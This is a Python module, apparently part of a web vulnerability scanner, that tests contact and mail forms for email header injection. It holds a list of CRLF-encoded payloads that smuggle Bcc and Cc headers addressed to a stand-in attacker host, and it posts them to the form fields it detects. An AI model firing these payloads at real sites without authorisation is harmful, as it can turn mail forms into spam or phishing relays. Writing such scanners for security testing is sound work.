"""Email header injection / SMTP smuggle probes on forms."""
from __future__ import annotations

from typing import Dict, List, Optional
from urllib.parse import urlparse

from utils.logger import get_logger

logger = get_logger(__name__)

_PAYLOADS = [
    "test@example.com%0ABcc:evil@attacker.example",
    "test@example.com%0D%0ABcc: evil@attacker.example",
    "test@example.com\r\nCc: evil@attacker.example",
    "test@example.com%0AContent-Type: text/html",
    '"test@example.com\nBcc: evil@attacker.example"@x.com',
    "test@example.com%00%0ABcc:evil@attacker.example",
]


class EmailHeaderInjectionTester:
    def __init__(self, http_client, config: Dict):
        self.http_client = http_client
        self.config = config

    def scan(self, url: str, context: Optional[Dict] = None) -> List[Dict]:
        path = urlparse(url).path.lower()
        html = ""
        if context and context.get("response") is not None:
            html = (getattr(context["response"], "text", "") or "").lower()
        if not any(k in path for k in ("contact", "mail", "feedback", "invite", "share", "subscribe")):
            if "email" not in html and "mailto" not in html and "type=\"email\"" not in html:
                return []

        vulns: List[Dict] = []
        email_fields = ["email", "from", "to", "reply_to", "reply-to", "mail", "user_email"]
        if context and context.get("forms"):
            for form in context["forms"]:
                if not isinstance(form, dict):
                    continue
                for inp in form.get("inputs") or []:
                    if not isinstance(inp, dict):
                        continue
                    name = (inp.get("name") or "").lower()
                    typ = (inp.get("type") or "").lower()
                    if "mail" in name or typ == "email":
                        email_fields.append(inp.get("name") or name)
        email_fields = list(dict.fromkeys(email_fields))

        for inject in _PAYLOADS[:4]:
            fields = {
                "subject": "deep-eye%0ABcc:evil@attacker.example",
                "message": "probe",
                "name": "tester",
                "body": "probe",
            }
            for f in email_fields[:4]:
                fields[f] = inject
            try:
                resp = self.http_client.post(url, data=fields)
                if not resp:
                    continue
                body = (getattr(resp, "text", "") or "").lower()
                status = getattr(resp, "status_code", 0)
                if status in (200, 201, 302) and not any(
                    x in body for x in ("invalid email", "not a valid", "malformed", "invalid address")
                ):
                    vulns.append({
                        "type": "Email Header Injection",
                        "severity": "medium",
                        "url": url,
                        "parameter": email_fields[0] if email_fields else "email",
                        "payload": inject,
                        "evidence": f"HTTP {status} accepted CRLF-ish email payload",
                        "description": "Contact/mail endpoint may allow header injection (Bcc/Cc smuggling)",
                        "remediation": "Validate emails strictly; strip CR/LF from header fields",
                    })
                    break
            except Exception as e:
                logger.debug(f"email inject: {e}")
        return vulns
